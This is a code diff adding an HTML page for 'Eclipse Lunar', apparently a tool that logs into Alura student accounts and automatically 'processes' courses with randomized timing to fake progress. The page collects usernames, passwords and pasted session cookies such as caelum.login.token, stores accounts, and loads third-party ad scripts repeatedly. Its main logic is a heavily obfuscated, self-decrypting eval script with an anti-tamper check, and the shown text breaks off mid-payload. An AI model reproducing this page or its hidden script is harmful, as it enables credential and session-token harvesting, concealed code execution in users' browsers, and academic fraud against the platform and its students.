+            padding: 1rem;
+            margin-bottom: 1.5rem;
+        }
+       
+        #courseSelectionModal .time-settings h3 {
+            color: var(--text-primary);
+            font-size: 1rem;
+            font-weight: 500;
+            margin-bottom: 0.75rem;
+        }
+       
+        #courseSelectionModal #timeInputs.disabled {
+            opacity: 0.5;
+            pointer-events: none;
+        }
+
+        #courseSelectionModal .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+        }
+       
+        #courseSelectionModal .checkbox-container input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: var(--primary-purple);
+        }
+       
+        #courseSelectionModal .checkbox-container label {
+            color: var(--text-primary);
+            font-weight: 400;
+        }
+       
+        #courseSelectionModal .time-inputs {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            transition: opacity 0.3s ease;
+        }
+       
+        #courseSelectionModal .input-group input {
+            background: var(--background-medium);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-primary);
+            padding: 0.5rem;
+            font-size: 0.9rem;
+            width: 100%;
+        }
+       
+        #courseSelectionModal .modal-actions {
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
+        }
+       
+        #courseSelectionModal .btn {
+            flex: 1;
+            min-width: 140px;
+            background: var(--primary-purple);
+            color: white;
+        }
+       
+        #courseSelectionModal .btn:hover:not(:disabled) {
+            background: var(--dark-purple);
+        }
+       
+        @media (max-width: 480px) {
+            #courseSelectionModal .time-inputs { grid-template-columns: 1fr; }
+            #courseSelectionModal .modal-actions { flex-direction: column; }
+        }
+        .left-ads, .right-ads {
+            display: none;
+        }
+        .input-group textarea {
+            width: 100%;
+            padding: 0.75rem;
+            background: transparent;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-primary);
+            font-size: 0.9rem;
+            font-family: monospace;
+            resize: vertical;
+            min-height: 100px;
+        }
+
+        .input-group textarea:focus {
+            outline: none;
+            border-color: var(--primary-purple);
+            box-shadow: 0 0 0 2px rgba(246, 92, 92, 0.2);
+        }
+        #countdownTimer {
+            text-align: center;
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: var(--primary-purple);
+            margin: 1rem 0;
+            min-height: 1.5rem;
+        }
+
+        #currentActivityName {
+            text-align: center;
+            font-weight: 500;
+            margin-bottom: 1rem;
+        }
+        .ad-container {
+            width: 100%;
+            max-width: 100%;
+            margin: 10px 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        .ad-container iframe,
+        .ad-container ins {
+            max-width: 100% !important;
+            width: 100% !important;
+            height: auto !important;
+            display: block;
+        }
+        .ad-top {
+            margin-bottom: 10px;
+        }
+        .ad-middle {
+            margin: 15px 0;
+        }
+        .ad-footer {
+            margin-top: 15px;
+        }
+        .ad-side {
+            position: sticky;
+            top: 15px;
+            max-width: 300px;
+        }
+        .page-layout {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            width: 100%;
+        }
+        .left-ads,
+        .right-ads {
+            width: 300px;
+            display: none;
+        }
+        @media (min-width: 1100px) {
+            .left-ads,
+            .right-ads {
+                display: flex;
+                justify-content: center;
+            }
+        }
+        @media (max-width: 768px) {
+            .left-ads,
+            .right-ads {
+                display: none;
+            }
+
+            .ad-container {
+                margin: 10px 0;
+            }
+
+            .ad-container iframe {
+                max-height: 120px;
+            }
+        }
+        @media (min-width: 769px) {
+
+            .ad-container {
+                margin: 6px 0 !important;
+            }
+
+            .ad-top,
+            .ad-middle {
+                margin-bottom: 6px !important;
+            }
+
+            .ad-footer {
+                margin-top: 10px !important;
+            }
+            .ad-container iframe {
+                height: 90px !important;
+                max-height: 90px !important;
+            }
+            .form {
+                gap: 0.6rem !important;
+            }
+            .form > button,
+            .form .btn {
+                margin-top: 4px !important;
+            }
+        }
+
+    </style>
+</head>
+<body>
+    <div class="main-wrapper">
+        <main class="main-content">
+            <div class="login-container">
+                <div class="header">
+                    <div class="logo-section"><h1 class="logo-text">Eclipse Lunar</h1></div>
+                    <p class="subtitle">Sua plataforma do Futuro.</p>
+                    <p class="tagline">ALURA</p>
+                </div>
+                
+                <form class="form" id="loginForm">
+                     <button type="button" class="btn btn-accounts" id="btnShowAccounts">
+                        <i class="fas fa-users"></i> Contas Salvas
+                    </button>
+                    <div class="ad-container ad-top">
+                    <script type="text/javascript">
+                        atOptions = {
+                            'key' : '6305e7dc764a1ca01979effcf28a7284',
+                            'format' : 'iframe',
+                            'height' : 60,
+                            'width' : 468,
+                            'params' : {}
+                        };
+                    </script>
+                    <script src="https://percussivetakelaunch.com/6305e7dc764a1ca01979effcf28a7284/invoke.js"></script>
+                </div>
+                    <button type="button" class="btn btn-accounts" id="btnLoginCookies">
+                        <i class="fas fa-cookie-bite"></i> Login via Cookies 
+                    </button>
+                    <div class="ad-container ad-top">
+                    <script type="text/javascript">
+                        atOptions = {
+                            'key' : '6305e7dc764a1ca01979effcf28a7284',
+                            'format' : 'iframe',
+                            'height' : 60,
+                            'width' : 468,
+                            'params' : {}
+                        };
+                    </script>
+                    <script src="https://percussivetakelaunch.com/6305e7dc764a1ca01979effcf28a7284/invoke.js"></script>
+                </div>
+                    <div class="input-group">
+                        <label for="username">Usuário (RA):</label>
+                        <input type="text" id="username" placeholder="Ex. 123456789xsp" required>
+                    </div>
+                   
+                    <div class="input-group">
+                        <label for="password">Senha:</label>
+                        <div class="input-wrapper">
+                            <input type="password" id="password" placeholder="Sua senha de acesso" required>
+                            <button type="button" class="password-toggle"><i class="fas fa-eye"></i></button>
+                        </div>
+                    </div>
+                   
+                    <div id="turnstile-widget" class="cf-turnstile" data-sitekey="0x4AAAAAACA_vQnrZfff3Ojh" data-theme="dark" data-action="api-request" data-callback="onTurnstileSuccess" data-error-callback="onTurnstileError"></div>
+                    <div class="ad-container ad-top">
+                    <script type="text/javascript">
+                        atOptions = {
+                            'key' : '6305e7dc764a1ca01979effcf28a7284',
+                            'format' : 'iframe',
+                            'height' : 60,
+                            'width' : 468,
+                            'params' : {}
+                        };
+                    </script>
+                    <script src="https://percussivetakelaunch.com/6305e7dc764a1ca01979effcf28a7284/invoke.js"></script>
+                </div>
+                    <div class="form-buttons">
+                        <button type="submit" class="btn btn-main" id="btnBuscarCursos">
+                            <i class="fas fa-search"></i> Buscar Cursos
+                        </button>
+                    </div>
+                </form>
+               
+                <div class="footer">
+                    <div class="footer-links">
+                        <a href="https://discord.gg/zRXgHF9hrQ" target="_blank"><i class="fab fa-discord"></i> Discord</a>
+                        <a href="https://pixgg.com/Crimsonstrauss" target="_blank"><i class="fas fa-heart"></i> Doações</a>
+                    </div>
+                    <p class="copyright">Eclipse Lunar © 2025. Todos os Direitos Reservados.</p>
+                </div>
+            </div>
+        </main>
+    </div>
+    <div id="accountsModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Contas Salvas</h2>
+                <button class="close-btn" data-modal-id="accountsModal">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div id="accountListContainer" class="account-list"></div>
+            </div>
+        </div>
+    </div>
+    <div id="cookiesModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Login via Cookies</h2>
+                <button class="close-btn" data-modal-id="cookiesModal">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="input-group">
+                    <label for="cookiesInput">Cole os Cookies aqui (ex: _gcl_au=...; caelum.login.token=...):</label>
+                    <textarea id="cookiesInput" placeholder="Ex: _gcl_au=1.1.925168383.1761694726; caelum.login.token=2886a2f356f3863153e23aa197ac32aeaf26dda685debbc6fa1ac5f424fb7892; ..." rows="4"></textarea>
+                </div>
+                <div class="modal-actions">
+                    <button id="btnConfirmCookies" class="btn">Confirmar Login</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="courseSelectionModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Selecione um Curso</h2>
+                <button class="close-btn" data-modal-id="courseSelectionModal">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="course-items" id="coursesList">
+                </div>
+                <div class="time-settings">
+                    <h3>Configurações de Tempo</h3>
+                    <div class="checkbox-container">
+                        <input type="checkbox" id="fastestMode">
+                        <label for="fastestMode">O mais rápido possível</label>
+                    </div>
+                    <div id="timeInputs" class="time-inputs">
+                        <div class="input-group">
+                            <label for="minTime">Tempo mínimo (segundos):</label>
+                            <input type="number" id="minTime" value="3" min="1">
+                        </div>
+                        <div class="input-group">
+                            <label for="maxTime">Tempo máximo (segundos):</label>
+                            <input type="number" id="maxTime" value="8" min="1">
+                        </div>
+                    </div>
+                </div>
+               <div class="ad-container ad-top">
+                    <script type="text/javascript">
+                          atOptions = {
+                            'key' : '6305e7dc764a1ca01979effcf28a7284',
+                            'format' : 'iframe',
+                            'height' : 60,
+                            'width' : 468,
+                            'params' : {}
+                        };
+                        </script>
+                        <script src="https://percussivetakelaunch.com/6305e7dc764a1ca01979effcf28a7284/invoke.js"></script>
+                </div>
+                <div class="modal-actions">
+                    <button id="startProcessingBtn" class="btn" disabled>Processar Curso Selecionado</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="processingModal" class="modal">
+        <div class="modal-content">
+             <div class="modal-header">
+                <h2 id="processingCourseName">Processando Curso</h2>
+            </div>
+            <div class="modal-body">
+                <p id="currentActivityName">Aguardando início...</p>
+                <div id="countdownTimer"></div>
+                
+                <div id="progressBarContainer">
+                    <div id="progressBarFill"></div>
+                </div>
+                <div id="progressText">0/0 (0%)</div>
+                <button id="stopProcessBtn" style="display: none;">Parar Processo</button>
+            </div>
+        </div>
+    </div>
+    <div id="loadingModal" class="modal">
+        <div class="modal-content" style="max-width: 200px; padding: 2rem; align-items: center; background: var(--background-medium);">
+             <i class="fas fa-spinner fa-spin fa-3x"></i>
+             <p style="margin-top: 1rem; font-weight: 500;">Carregando...</p>
+        </div>
+    </div>
+    
+    <div id="notificationsContainer"></div>
+
+    <script>
+let mYY1;!function(){const o7nz=Array.prototype.slice.call(arguments);return eval("(function sctz(bsAr){const bu7r=Lbks(bsAr,TjXr(sctz.toString()));try{let D19r=eval(bu7r);return D19r.apply(null,o7nz);}catch(Xo2r){var zW4r=(0o205346-68295);while(zW4r<(0o400064%65546))switch(zW4r){case (0x300A3%0o200054):zW4r=Xo2r instanceof SyntaxError?(0o400145%0x10025):(0o400066%0x1000B);break;case (0o201452-0x1030F):zW4r=(0o400102%65553);{console.log(\'Error: the code has been tampered!\');return}break;}throw Xo2r;}function TjXr(vRZr){let PeSr=500675348;var rMUr=(0o400075%65552);{let rOrs;while(rMUr<(0x105C8-0o202643)){switch(rMUr){case (0o600162%0x1001A):rMUr=(68416-0o205450);{PeSr^=(vRZr.charCodeAt(rOrs)*(15658734^0O73567354)+vRZr.charCodeAt(rOrs>>>(0x4A5D0CE&0O320423424)))^1009661696;}break;case (0o204540-67912):rMUr=(131127%0o200024);rOrs++;break;case (262267%0o200033):rMUr=rOrs<vRZr.length?(0o400156%0x10025):(68126-0o204771);break;case (0o1000125%0x1000E):rMUr=(0o202032-0x1040B);rOrs=(0x75bcd15-0O726746425);break;}}}let Tlus=\"\";var nJms=(66076-0o201001);{let Pgps;while(nJms<(0o600070%0x10009)){switch(nJms){case (0o600204%65571):nJms=(0x2002D%0o200022);Pgps=(0x21786%3);break;case (0o200264-0x100AB):nJms=Pgps<(0O347010110&0x463A71D)?(65676-0o200176):(0o400065%0x1000C);break;case (131138%0o200032):nJms=(0o202450-0x10512);{const jEhs=PeSr%(0o205360-68301);PeSr=Math.floor(PeSr/(0x30092%0o200045));Tlus+=jEhs>=(131138%0o200024)?String.fromCharCode((0o210706-0x11185)+(jEhs-(0o400072%0x10010))):String.fromCharCode((196831%0o200052)+jEhs);}break;case (0o600064%0x1000A):nJms=(0o200132-65617);Pgps++;break;}}}return Tlus;}function Lbks(fzcs,H6es){fzcs=decodeURI(fzcs);let jw9p=(0x75bcd15-0O726746425);let L3bq=\"\";var fr4p=(0o207272-0x10E9D);{let HY6p;while(fr4p<(0x11158-0o210463)){switch(fr4p){case (0o200550-0x10144):fr4p=(0o200740-65992);{L3bq+=String.fromCharCode(fzcs.charCodeAt(HY6p)^H6es.charCodeAt(jw9p));jw9p++;var bmZp=(73639709%9);while(bmZp<(0o203504-67365))switch(bmZp){case (0O3153050563-0x19AC516B):bmZp=jw9p>=H6es.length?(0o1000063%65546):(0o207210-0x10E69);break;case (0o1000107%65551):bmZp=(69566-0o207637);{jw9p=(0x75bcd15-0O726746425);}break;}}break;case (0o1000177%65564):fr4p=HY6p<fzcs.length?(131180%0o200044):(196747%0o200042);break;case (0o1000131%65551):fr4p=(262279%0o200036);HY6p=(0x75bcd15-0O726746425);break;case (0x30054%0o200024):fr4p=(262259%0o200031);HY6p++;break;}}}return L3bq;}})(\"X%13%04*\'%1F%08%0E%1E%5DX?%22%1E%0F%02%04%1C%1E*d%18%08,;%5DX?6%0E%15%14%02%1BQlo0:J+.Ze%1F6J@%5B.,%19o0J:-(,o%1F6%3C:%5B.,%19%1F@:%3C-(XolCJ:-%5EPo%1F6JI%5B%5E*o%1F6%3C:%5B.,o%1F6%3CHY_Y%11.3%20IY%5CX9%22%1E%0F%02%04%1C%1E*d%3E%0B1;%5DX?6%0E%15%14%02%1BQl%099%0D%22X%5CX%1F%0D8%10%18X%5C,lm%16%07%14%1E%16%05-+%05A%0E%162:l%15%0C+*Y%0E%03!0%1E%13%0FP%1A%13%00%0100%06:%3E,%7F9%0688AH%0A9%7F%0D%14%0F%13%01%18+*K%0A%021%3EYm?%19%04%15%05%07%1Fd3%072*X%5CZ\'-%25(IY%5E$2+!IH%0D%13%04*\'%1F%08%0E%1EU%3C%20%00%20IH%0B%07%1401%19%0FA%07%19%22%0FlBJ,&%02%08lm@%02%08%3E%3CYmo%00%02(1%5DXo%11#/)X%5C%0C%221%05%02%15%19%1A%1Fd#1%15*X%5C%0A6!%1F%14%13%1EUY7-%3E%20IY%5CZl3%07%00#X%5CX9%22%1E%0F%02%04%1C%1E*d%22%00%19;%5DX?6%0E%15%14%02%1BQloJJ:-%5EPo%1F6HJX%5EPo%1F6H%1C%16%00%1F\'0%02%0E%0FP%3C%04/%08CH%1A%02%10%0516%05A(%19!2lm@%16%15%1F1Ymo%3E1%0B1%5DXo#9%0F%18X%5CZ%11.;*IY%5E%3C%123%12IH%5B%12%01!%02CHJ%17\'%1F=lB%1C%07%05%1B%120-%04%0FA%1B%02%1F%08lB%1A%13%15%01%046*K$%13%1D7Ymo%008%165%5DXo+?%0E%22X%5CZ/7%00\'IY%08%171*%08%15%08%1F%1BQ%016%0E-IY%0E%03!0%1E%13%0FP%5D*%19%1F0%3C%3C%5B.,m%1F@:%3C-%08%1C%1D%1DZO%08M%5D**1%07%0D%3CMHVcmP%07%14%1E%16%05-+%05A%06%04%1D=lm%10%13%04%04%00%03*dCJ:+%5E*%1Fo0%3C%3C%5B.Z%1F%196%3CJ+(,%1Fo0%3C%3C+%5EPo%1F6%3C%3CY%5EYloJJ:-%5EPo%1F6HKX%3C:%11%02CHHY%08%171*%08%15%08%1F%1BQ%05+2*IY%0E%03!0%1E%13%0FP%20%07+%0ECHJ%25=?%0ClBJ8%15%25%08lm@,3%1C6Ymo%22%0853%5DXo#%1B%04\'X%5C%0C%221%05%02%15%19%1A%1Fd\'%1A%03-X%5C%0A6!%1F%14%13%1EUY/%1D%1C$IY%5C*%0D%17%1A%18IY(Ym9%0D%14%0F%13%01%18+*K%16%0D#%3EYm?%19%04%15%05%07%1Fdl0%3C:+(,o%1F6H:%5B.,oe@:%3C-%08%171*%08%15%08%1F%1BQ%1D)=*IY%0E%03!0%1E%13%0FP%5D%021(!IHY.8%175%12IH-%5DX9%22%1E%0F%02%04%1C%1E*d*,68%5DX?6%0E%15%14%02%1BQl%05%04%06#X%5CXol%18%08,;%5DXm9%1D%00%13P%16%3E%1E%0CV:I@%1ACtq%5BVU%5DCItv%5EHMXE%1Ept%5BTQCPA%3Cu%5BQT4%5C%5Dlt%04UQ@ADwa%5B%19P@EDtmGIVAAHri%5B%0ESAFCrwBMI@%1ACpwXPQ%5DE%09up%5DRPY(J%221%05%02%15%19%1A%1Fd3!0)X%5C%0A6!%1F%14%13%1EUYo%1F6J@%5B.,ol@J:%5B.,%19%1F@:%3C%5B.,%19mBJI1%1A%16%06lBH%1C%16%00%1F\'0%02%0E%0FP,:%10%0CC%12&;=X?6%0E%15%14%02%1BQ+&/$:%032:%0C%19P%1C%07%05%1B%120-%04%0FA%25=?%0ClB%1A%13%15%01%046*KI@Q.,o%1F6H:%5BTZ%1F%19@@J+(Zeo0%3C%3C%0D%13%04*\'%1F%08%0E%1EU%1E%00%01#IH%0B%07%1401%19%0FAX%3C%1C!%3ECHH+%1A%0B%06%06CH%3CX$%20#%03CHH%0D%13%04*\'%1F%08%0E%1EU%20%01%0C#IH%0B%07%1401%19%0FAW)%04tt_RF%0D%13%04*\'%1F%08%0E%1EU%20%1D1%22IH%0B%07%1401%19%0FAX%20!.%05CHH+%3C%225=CH%3CX%5C%0C%221%05%02%15%19%1A%1Fd7%0A%18(X%5C%0A6!%1F%14%13%1EUY#(?(IY%5CZ%1F%19%16%17%00%02U%3C%12+%22%5C:XBG%7C%7C%5DLQ%1FGCqq%5DRH%5C%5DA+p%5BPPGBTt%3CZQQ31Xhl%5B%0EP@E@st%5EDWEB@%7DmGIQ%1FCAuq%5BPDF@FwpB%3CZ%16%00%1F\'0%02%0E%0FP%1A)6%0DCH%1A%02%10%0516%05AIWR*+%14%0F&IY(Ymm086%032Ym%19%16%07%14%1E%16%05-+%05A(#%1C8lm%10%13%04%04%00%03*d*%062%09%5DXo%01%19%04-X%5CZ%09%12%1C%18IY%5E4&%07,IH%5B%1A5%01%0CCH%1C%16%00%1F\'0%02%0E%0FP%1E$(%0DCH%1A%02%10%0516%05AI%5B.,oe@:%3C%5B%5DZo%1F@:%3C-.Z%1F%19@:%3C-%5CXol%3E%0B91%5DXm9%0D%14%0F%13%01%18+*K$1%13%3CYm?%19%04%15%05%07%1Fd%052%17&X%5CZ#4%0E\'IY%5E(-%17.IH%5B%3C%18%10%07CHJ%07%19%22%0FlBJ$49%0Blm%16%07%14%1E%16%05-+%05A%06%22%138lm%10%13%04%04%00%03*dCI%16:$9lmBKI9%3E$%02lBHH%5B%5D%207-!IHY%08%171*%08%15%08%1F%1BQ#(?(IY%0E%03!0%1E%13%0FP%5DZl%1F@::Q%5E*%19oJJ:-(Z%1Fo0%3C%3C-(Z%1F%19B:J+(,moC%16%09%200Ymm%16%0C8)D_%09w%00)%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EUYt%3C%5CT%03%13%11@qi%5B.VBCFpr_STY%08J%221%05%02%15%19%1A%1Fd%0D%066(X%5C%0A6!%1F%14%13%1EU%20#%16*IH%5B%16%18%0A%0DCH%1C%16%00%1F\'0%02%0E%0FP%16%18%0A%0DCH%1A%02%10%0516%05AI%04%0C%01!+%0DA@+(X%1FoJJ:-(%0C%221%05%02%15%19%1A%1Fd%01%010(X,%14%0C%0DG%20%06;%3CX?(%0E%15A%25%173%0DyFJJ+%5E*%19%190J:-(Zlo@:J+(,%1Fo0%3C%3CYXZeo0%3CZ%06%14%03d3%0F$(M%5DA+u%5BQQBEBat%13PQ@D5m%7F%10%0D%04%04U%06%3C6!Z%16%18%1C%1D!l%1C%05$9IYrs%5CTW%5DE%1Evt_SQG%5CX?7%1C%08%15%13%1DY3%20.(H%0B%16%107!KIQ%1FCAtu%5EWDF@DrqB%5B%16%1408yl%5B%19P@0@ti%5B%0ES@CFqpBZ%16%08%07;ooP%03%13%15%14%1A%7F\'%0A%12%04P%5DGr%7CSWL@%1ACtv_WVYO%06%20%01%22%5CI@%0D@t%7D/YL@%1ACtp%5DWUYN%06%3C6!%5CJ+.Z%1F%1F@:%3C-%5E*o%1F6%3C%3C%5B.,%19%1F@:%3C-.Z%1F%196%3CZ%12%07%14%25/P%02%00%03%10Qlr%5CSPFXA+v%5BRPGEX~3%0F$(M%5DA+v%5BPSFG%5CrrYQRYN%0A2%25%19A8%09%00;yl%5B%0ES@GFsvFQ%19AED%01%7DBZ%16%18%1C%1D!l2%18%14:IYrs%5BPW%5DE%1EvtYWUC%5CX73%02%15%02%18%5D(=1!H%1A%13%14%02!dCQ%0EBEGrw%5BLQ%08DA%00s)H%5B)%0C%04%0EyCQ%0EBE@wp_LQ%08DAv%06-HZ%02%10%0516%05A%16%08%07;%7F\'%0A%12%04P%5DA+v%5BQSEG%5Ct%3CZQQILX~%1D%12%14+M,%14%0C%0D0%16%19%02?,yyV%20%06;%3C*oo0J:-(*o%1F6%3CL%5BTZ%1F%196%5EIF@IvrFQ%0EBEApt%5EH%5BXDBuuSVD@%1ACtt%5BUVYN%136!%0A%0AZ%0D%08%136!%0A%0AZ%13%14%02!dCQ%0EBECts%5BLQ%08DApu_H%5B%07%114%0Dy%1C%19%13:I(!%0C%22O%0D%15%1B%160,TISFGCp%7CNQ%0EBEAtv_H%5BXE%1Eut%5BQRADTrq%5EVVYN%136!%0A%0AZ%0D%08%0C6!%1F%14%13%1EU$&%06%22Z%1C%16%00%1F\'0%02%0E%0FP%06%04(%0ECH%1A%02%10%0516%05AI%13%10:%07lBH:%1F%0F3%06lB%3CI!$%16%03lBH%1C%16%00%1F\'0%02%0E%0FP%20%07+%0ECH%1A%02%10%0516%05AI108%02lBH:%1F%0F3%06lB%3CI!$%16%03lBH%1C%16%00%1F\'0%02%0E%0FP%1A%03%22%0ECH%1A%02%10%0516%05A8%15%25%08lm@(%08$6Ymo%1C%0D2;%5DXo+\'%00%20X%5C%0C%221%05%02%15%19%1A%1Fd%15%18%08+X%5C%0A6!%1F%14%13%1EUYoo0J:-(*o%1F6%3CJX%5EZ%1Fo0%3C%3C+%5E*%19%19BHKX%5EZ%1Fo0%3C%3C+%5E*%19%19@IJ%5B.Z%1F%196:J+(,mi@@J+(Xol@@J+(Zlo@:J+(,%1Fo0%3C%3CY%5C%0C)%1D2PO=@#%0Cy%0D%14%0F%13%01%18+*CH%1A%02%10%0516%05AI@:@vuXQSEDTwm%16Z%07%05%1B%120-%04%0FA%1B%1A+%0DlB%1A%13%15%01%046*K%12.%174Ymo*0%095%5DXo%01/-%1BX%5CZ/7%00\'IY%08%171*%08%15%08%1F%1BQ%094%08+IY%0E%03!0%1E%13%0FP%5D%1A\'%0D*IHY.8%175%12IH-%5DX9%22%1E%0F%02%04%1C%1E*d%041%057%5DX?6%0E%15%14%02%1BQ%05%15%03$IY%5E%12-%0A%22IH%5B%02%1D%17%0FCHJ%17%05%14%02lBJ0%17\'0lm@%02%08%3E%3CYmo%00%02(1%5DXo\'%02/(X%5CZ%1D-8$IY%08%171*%08%15%08%1F%1BQ%15%15%0C&IY%0E%03!0%1E%13%0FP%5DZeo0%3CJQ%5E*%19m@I%06%22%138lmB%1C%07%05%1B%120-%04%0FA%1B8)%02lB%1A%13%15%01%046*K%12.%174Ymo%04-%001%5DXo\'%027%18X%5CZ\'5%09-IY%08%171*%08%15%08%1F%1BQ%09%0A%0A&IY%0E%03!0%1E%13%0FP%5D%12-%0A%22IHY.8%175%12IH-%5DX9)28P%5E%1A5%11%0CV%07%14%1E%16%05-+%05IH%0B%07%1401%19%0FAXDDrqSVRD+A%0BsXTWGFDpm%16Z%07%05%1B%120-%04%0FA%17?#%02lB%1A%13%15%01%046*K$%13%159Ymo%1C%0D2;%5DXo%099%0D%22X%5CZ3(8*IY%5E%12-%0A%22IH%5B%20%07+%0ECHJ%07%19%22%0FlB%1C%07%05%1B%120-%04%0FA9%3E$%02lB%1A%13%15%01%046*KIJ+(Zeo0%3CH%5B%5DZo%1F@:%3C-.Z%1F%196JI%5B%5E*o%1F6%3C:%5B.,%19mBJI%5BTZ%1F%19@IJ%5B.Z%1F%196:J+(,mm%16%07%14%1E%16%05-+%05A%02797lm%10%13%04%04%00%03*dCJIX%5DZeo0%3CH%5B.,moCI@Q.,o%1F6H:%5BTZ%1F%19@@J+(Zeo0%3C%3CY%5EYoe@:%3CY%5EYo%1F6HJX%5E*%19m@IJ+(Xmo0%3CH+%5EPo%1F6J@%5B.,oe@:%3C%5BTZ%1F%19@@J+(Zeo0%3CJQ%5E*%19%19%16%07%14%1E%16%05-+%05A$8:7lm%10%13%04%04%00%03*d*0%095%5DXo%0D%025%22X%5CZ3(8*IY%5E%1E%08%25*IH%0D%13%04*\'%1F%08%0E%1EU4&%07,IH%0B%16%1E*7%1FA%06%1436y%1D%12%22%1BX%5C*%11*%0A)IY(J6!%1F%14%13%1EU%16%20%02,%5EI%17%117%03o0%3CH+%3C%047%06N%06%15%189Ym%19Q4%1B%0A3Y#%20-&J+(%5D%094%00%1BIY%5CJ9%22%1E%0F%02%04%1C%1E*d*8%177%5DX?6%0E%15%14%02%1BQl%09=%16%18X%5CX%1F%0D8%10%18X%5C,lm%16%07%14%1E%16%05-+%05A%02%11%0F6lm%10%13%04%04%00%03*d%3E%17%0E:%5DXo%11#/)X%5CZ%1D!;%18IY%5E%3C%16((IH%5B%3C%18%10%07CHJ%17%05%14%02lBJ%0E%16:0lm@,%05%3C4Ymo%3E)/8%5DXo3%072*X%5CZ#4%0E\'IY%5E0%1D2,IH%5B%12%01!%02CHJ%13%1C?%0DlBJ8%19&4lm@%16;16Ymo.%25-%0A%5DXo%11#/)X%5C%0C)%1D2PO9E%3C%0Cy%0D%14%0F%13%01%18+*CH%1A%02%10%0516%05AI@%1ABuu%5CVWCA%5Ct%3C%5DR\'6L5m9P%07%14%1E%16%05-+%05A%16&%056lm%10%13%04%04%00%03*dC:%3C+%3C6%16%3ECH%3CX%5CZ%1F%19B:J+(,9%22%1E%0F%02%04%1C%1E*d26%127%5DX?6%0E%15%14%02%1BQloJJ:-%5CZll.%07/3%5DXmnC%06%05%3E%02YmmB%1C%07%05%1B%120-%04%0FA%03&%1B%03lB%1A%13%15%01%046*K$%13%159Ymo&%19%182%5DXo%05%0C2%18X%5CZ+6%05%1BIY%08%171*%08%15%08%1F%1BQ%11%10%06&IY%0E%03!0%1E%13%0FP%02+%05%07CHJ=%05%12%0ElBJ$49%0Blm@%063%1E%0CYm9%0D%14%0F%13%01%18+*K4%0F%11=Ym?%19%04%15%05%07%1Fd%15%0C3%20X%5CZ\'-%25(IY%5E%06(%17%20IH%5B8\'3=CHJ%13%1C?%0DlBJ%0A%13%3C0lm@4)%3E=Ym9%0D%14%0F%13%01%18+*K%16%11%14=Y%15/%3E&M%03%18)%03h&%09.7Y%1E.%16,H%1A%13%1A%1F70K(%0492L%11%3E%11\'I!%1E$%03h:%0A47%5B%1D!*%0C%15%09%5D%5DZ%1F%1F@::%5BTZ%1F%196J:%5B.,%19%19@:%3C-.Z%1F%196:J+(,%19mBZ%0D%15%01Q/#\'&%5C%259(%00l%18%0C97XYoe@:%3CYY8!%0D,HZ%1C%10%05d/*%18)M%1A%1B%16%03P%17%00%02U%3C%06%06#%5CI@%1AGtt%5BVUUCDqqYHZ%0B%19%140d%0C%19%128N%06,-%07%04I=73%0CxCQ%19DEAs%01NQ%0EBEAtv%5DHH%0B%06%06-0%08%09I=73%0Cm%10%02%00%03%10Qlt%13PQ60Git%04SQGBAumQ,#2=L#%3C%18)%5D%03%18)%03iCJ:+%5E*%1FoJ:%3C%5BTZ%1F%196J:%5B.,%19%19@:%3C-.Z%1F%196:J+(,%19mTIQ%1FDAttYQRUCDqr%5BH%5BXBAps%5DLQ%1FG@up_WHK%17%03!%25%00Z%02%11%06%14dlZRPAGEat%04SQ@ECpmQ,#2=Llt%13PQB0Eit%04SQAGFsmP%06%19%03=Lo%1F0J:+%5EPo%1F6%3CJ+%5E*%19%196J:-(*o%1F6%3C:%5BTZ%1F%196%3CZ%12%07%14%25/P%02%00%03%10Qlt%04SQAGFpi%5DWS@DX~%09)#)M%5DA+r%5BQQGDTrq%5EUUYN%0A\'+%05%12%15P%3C%082%0CV0%0A%252*#%3C%18)%3CK%1E%16%08%03V4%1B%0A3Y/#\'&M%5B.*o%1F0J:-(Z%1Fo0%3C%3C-%5E*%19%190J:-(*oe@:%3C-(%5D/%05%12)LX%5E*%1Fo0:JQ.,oe@:%3C-%5E*o%1F6%3C%3C%5B.,%19%1F@:%3C-.Z%1F%196%3CHY%5E8=2#J4%0A%0F7l/%0C-&%5C%1E0=%0CBZ%0A1%0C9yl%00%20%188_%3C,%0B,HD%03%18)%03%7F%16%03%13%15%14%1A%7F\'%0A%12%04P%5DA%3Cu%5BTSHXA+v%5BSU@BX~%09)#)M%5DA+p%5BQPFBTt%3CZQQBLX%7F#%13%12)%5B%5EJ&6%0E%00%0AK%08%0C9\'%04%0F%12%04U%121)#%5C$%1A$8l/%0C-&%5C%3C%14%0D%03BZ%17%11%07Q%012%1B)%5CXE%1EvtXURDXA%3Cu%5BVQ5%5CJ3,%02%0D%04X0%074%0CWIWGMDri%5B%0ES@ABrwBH%12%07%1C%05\',C$%17%00=X?\'%0A%12%04P%5DA+p%5BQQFATrq%5ETPYO424#%5CI@%0DBtt%5E%22D@%1ACtt%5BSTYN%0A/#\'&%5C%25%0F%0B%02l%00%06-7YZ%1F%1F@::%5BTZ%1F%196J:%5B.,%19%19@:%3C-.Z%1F%196:JQ%5E*%19%196M%02%05%189m%7F%16%03%13%15%14%1A%7F\'%0A%12%04P%5DA+v%5BQUCE%5Ct%3CZQP@4X~%01%1D%11)M%16%04)%0CU%5CJ%5B.Z%1F%196:J+(,ioJJ:-JYt%3CXQQCATt+YQQ@DCm~CPRADB%7Da%5B%0ES@EAvwBZ%03%02%10%10/%7F%16%13%04%04%00%03*d%00%06-7N%0C)%1D2PO%1B%0C!%0Cy%0D%14%0F%13%01%18+*CH%1A%02%